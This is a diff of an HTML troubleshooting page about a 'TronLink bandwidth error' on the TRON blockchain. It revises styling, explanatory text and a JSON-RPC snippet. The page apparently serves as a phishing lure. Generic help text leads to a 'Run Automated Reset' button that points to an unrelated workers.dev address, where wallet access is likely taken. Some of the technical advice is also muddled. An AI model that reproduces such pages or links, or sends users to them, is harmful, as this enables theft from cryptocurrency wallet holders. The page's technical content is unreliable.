@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #ff9455; }
     .btn {
-        background: #ff7b2c;
+        background: #cf6679;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,31 +41,34 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter a "TronLink bandwidth error" when attempting to perform transactions or interact with smart contracts on the TRON network, resulting in failed or pending transactions.</li>
+<li>Users encounter a "TronLink bandwidth error" when attempting to perform transactions or interact with the TRON network through TronLink, a popular TRON blockchain wallet.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to insufficient bandwidth, which is a resource required for transaction processing on the TRON network. Each account has a limited amount of bandwidth, and when this limit is exceeded, transactions cannot be processed.</li>
+<li>The error occurs due to insufficient bandwidth on the TRON network, which is required to process transactions. Bandwidth is a resource that measures the amount of data that can be transferred on the network.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the account's bandwidth by freezing TRX tokens, which allocates more bandwidth to the account.</li>
-<li>Use a different account with sufficient available bandwidth to perform the desired transactions.</li>
-<li>Temporarily adjust the transaction parameters to reduce the bandwidth required, such as by lowering the transaction fee:</li>
+<li>Increase the bandwidth by freezing TRX tokens, which allocates more bandwidth for transaction processing.</li>
+<li>Adjust the transaction parameters to optimize bandwidth usage, such as reducing the transaction size or splitting large transactions into smaller ones.</li>
+<li>Use the following JSON-RPC command to check the available bandwidth:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>tronweb.transactionBuilder.sendTrx<span class="o">(</span>
-<span class="w">  </span><span class="s2">&quot;recipient_address&quot;</span>,<span class="w"> </span>
-<span class="w">  </span><span class="m">100</span>,<span class="w"> </span>
-<span class="w">  </span><span class="s2">&quot;sender_address&quot;</span>
-<span class="o">)</span>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;getaccountresource&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">    </span><span class="s2">&quot;Your_Account_Address&quot;</span>
+<span class="w">  </span><span class="p">],</span>
+<span class="w">  </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>Consider using an external console for more complex bandwidth management tasks.</p>
+<p>Consider utilizing an external console for more advanced debugging and troubleshooting capabilities.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>TRON wallet with sufficient TRX balance</li>
-<li>TRON network connection</li>
-<li>TronLink extension or compatible wallet software</li>
+<li>TRON wallet with TronLink installed</li>
+<li>Basic understanding of TRON network and transaction processing</li>
+<li>Sufficient TRX tokens for bandwidth allocation</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
